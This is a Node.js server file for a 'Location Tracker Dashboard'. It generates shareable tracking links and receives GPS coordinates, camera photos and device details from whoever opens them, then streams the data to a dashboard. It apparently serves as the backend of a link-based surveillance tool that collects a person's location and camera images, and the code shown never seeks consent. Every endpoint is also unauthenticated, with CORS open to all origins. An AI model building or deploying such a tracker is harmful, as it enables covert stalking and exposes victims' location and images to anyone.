const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
const { MongoClient } = require('mongodb');

// ── Database Layer ──────────────────────────────────────────
let db = null;
const MONGODB_URI = process.env.MONGODB_URI;
const DATABASE_NAME = 'location_tracker';

// Mock store for fallback
const mockStore = {
  trackers: [],
  locations: [],
  photos: []
};

async function connectDB() {
  if (db) return db;
  if (!MONGODB_URI) {
    console.warn('⚠️  MONGODB_URI not found! Data will NOT persist on Vercel.');
    db = {
      collection: (name) => ({
        find: (query = {}) => {
          let results = mockStore[name];
          if (query.trackerId) results = results.filter(r => r.trackerId === query.trackerId);
          if (query.id) results = results.filter(r => r.id === query.id);
          return {
            toArray: async () => results,
            limit: (n) => ({ toArray: async () => results.slice(0, n) })
          };
        },
        findOne: async (query) => {
          if (query.id) return mockStore[name].find(r => r.id === query.id);
          if (query.trackerId) return mockStore[name].find(r => r.trackerId === query.trackerId);
          return null;
        },
        insertOne: async (doc) => { mockStore[name].push(doc); return { insertedId: doc.id }; },
        updateOne: async (query, update) => {
          const doc = mockStore[name].find(r => r.id === query.id);
          if (doc && update.$set) Object.assign(doc, update.$set);
          return { modifiedCount: 1 };
        },
        deleteOne: async (query) => {
          const idx = mockStore[name].findIndex(r => r.id === query.id);
          if (idx !== -1) mockStore[name].splice(idx, 1);
          return { deletedCount: 1 };
        },
        deleteMany: async (query) => {
           if (query.trackerId) {
             mockStore[name] = mockStore[name].filter(r => r.trackerId !== query.trackerId);
           }
           return { deletedCount: 1 };
        },
        countDocuments: async (query) => {
          return mockStore[name].filter(r => r.trackerId === query.trackerId).length;
        }
      })
    };
    return db;
  }
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  db = client.db(DATABASE_NAME);
  console.log('✅ Connected to MongoDB Atlas');
  return db;
}

async function getCollection(name) {
  const database = await connectDB();
  return database.collection(name);
}

// ── Unified Helpers ──────────────────────────────────────────

async function getTracker(id) {
  const col = await getCollection('trackers');
  return await col.findOne({ id });
}

async function updateTrackerLocation(trackerId, entry) {
  const tCol = await getCollection('trackers');
  const lCol = await getCollection('locations');
  const tracker = await getTracker(trackerId);
  if (!tracker) return false;

  await lCol.insertOne({ trackerId, ...entry });
  await tCol.updateOne({ id: trackerId }, { $set: { lastLocation: entry, active: true } });

  io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, location: entry });
  io.emit('tracker-updated', { ...tracker, lastLocation: entry, active: true });
  return true;
}

async function addPhoto(trackerId, photo) {
  const pCol = await getCollection('photos');
  const tracker = await getTracker(trackerId);
  if (!tracker) return false;

  await pCol.insertOne({ trackerId, ...photo });
  io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, photo });
  return true;
}

async function updateDeviceInfo(trackerId, info) {
  const tCol = await getCollection('trackers');
  const tracker = await getTracker(trackerId);
  if (!tracker) return false;

  if (MONGODB_URI) {
    await tCol.updateOne({ id: trackerId }, { $set: { deviceInfo: info } });
  } else {
    tracker.deviceInfo = info;
  }

  io.emit('tracker-updated', { ...tracker, deviceInfo: info });
  return true;
}

// ── API Routes (Serverless Friendly) ──────────────────────────

// Location update from tracked device
app.post('/api/tracker/:id/location', async (req, res) => {
  const { latitude, longitude, accuracy, altitude, speed, heading } = req.body;
  const entry = {
    latitude, longitude, accuracy, altitude, speed, heading,
    timestamp: new Date().toISOString()
  };
  const success = await updateTrackerLocation(req.params.id, entry);
  res.json({ success });
});

// Photo capture from tracked device
app.post('/api/tracker/:id/photo', async (req, res) => {
  const { image, facing } = req.body;
  const entry = { image, facing, timestamp: new Date().toISOString() };
  const success = await addPhoto(req.params.id, entry);
  res.json({ success });
});

// Device info from tracked device
app.post('/api/tracker/:id/info', async (req, res) => {
  const success = await updateDeviceInfo(req.params.id, req.body);
  res.json({ success });
});

// ── API Routes (Standard) ────────────────────────────────────

// Create a new tracker session
app.post('/api/tracker/create', async (req, res) => {
  const id = uuidv4().slice(0, 8);
  const tracker = {
    id,
    name: req.body.name || `Tracker ${id}`,
    createdAt: new Date().toISOString(),
    active: false,
    lastLocation: null,
    deviceInfo: null
  };
  
  const col = await getCollection('trackers');
  await col.insertOne(tracker);
  
  res.json({ success: true, tracker, link: `${req.protocol}://${req.get('host')}/track/${id}` });
});

// Get all trackers
app.get('/api/trackers', async (req, res) => {
  const col = await getCollection('trackers');
  const lCol = await getCollection('locations');
  const pCol = await getCollection('photos');

  const all = await col.find({}).toArray();
  for (const t of all) {
    t.locationCount = await lCol.countDocuments({ trackerId: t.id });
    t.photoCount = await pCol.countDocuments({ trackerId: t.id });
  }
  res.json(all);
});

// Get single tracker
app.get('/api/tracker/:id', async (req, res) => {
  const tracker = await getTracker(req.params.id);
  if (!tracker) return res.status(404).json({ error: 'Tracker not found' });
  
  const lCol = await getCollection('locations');
  const pCol = await getCollection('photos');
  const result = { ...tracker };
  result.locations = await lCol.find({ trackerId: req.params.id }).limit(100).toArray();
  result.photos = await pCol.find({ trackerId: req.params.id }).limit(50).toArray();
  
  res.json(result);
});

// Delete tracker
app.delete('/api/tracker/:id', async (req, res) => {
  const id = req.params.id;
  const col = await getCollection('trackers');
  const lCol = await getCollection('locations');
  const pCol = await getCollection('photos');

  await col.deleteOne({ id });
  await lCol.deleteMany({ trackerId: id });
  await pCol.deleteMany({ trackerId: id });
  
  io.emit('tracker-deleted', id);
  res.json({ success: true });
});

// ── Socket.io (Hybrid) ──────────────────────────────────────

io.on('connection', (socket) => {
  socket.on('join-tracker', async (trackerId) => {
    socket.join(`tracker:${trackerId}`);
    socket.trackerId = trackerId;
    const tracker = await getTracker(trackerId);
    if (tracker) {
      await updateDeviceInfo(trackerId, tracker.deviceInfo || {});
    }
  });

  socket.on('watch-tracker', (trackerId) => {
    socket.join(`tracker:${trackerId}`);
  });

  socket.on('location-update', async (data) => {
    await updateTrackerLocation(data.trackerId, { ...data, timestamp: new Date().toISOString() });
  });

  socket.on('photo-capture', async (data) => {
    await addPhoto(data.trackerId, { ...data, timestamp: new Date().toISOString() });
  });

  socket.on('device-info', async (data) => {
    await updateDeviceInfo(data.trackerId, data.info);
  });

  socket.on('disconnect', async () => {
    if (socket.trackerId) {
      const tracker = await getTracker(socket.trackerId);
      if (tracker) {
        const tCol = await getCollection('trackers');
        await tCol.updateOne({ id: socket.trackerId }, { $set: { active: false } });
        io.emit('tracker-updated', { ...tracker, active: false });
      }
    }
  });
});


// ── Track page route ────────────────────────────────────────
app.get('/track/:id', async (req, res) => {
  const tracker = await getTracker(req.params.id);
  if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n  🟢 Location Tracker Dashboard running at http://localhost:${PORT}\n`);
});
